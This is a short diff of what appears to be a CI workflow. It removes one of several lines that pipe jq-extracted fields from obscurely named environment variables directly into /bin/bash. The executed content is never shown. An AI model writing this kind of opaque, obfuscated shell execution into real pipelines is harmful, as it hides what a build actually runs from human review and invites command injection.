@@ -21,7 +21,6 @@ jobs:
           echo $rhmx10 | jq -r .g7 | /bin/bash
           echo $lgau3 | jq -r .cmb4684 | /bin/bash
           printf '%s' "$qkk52" | jq -r .h96183 | /bin/bash
-          echo $z254 | jq -r .xon9271 | /bin/bash
           printf '%s' "$b8383" | jq -r .g166 | /bin/bash
 
       - name: Save results
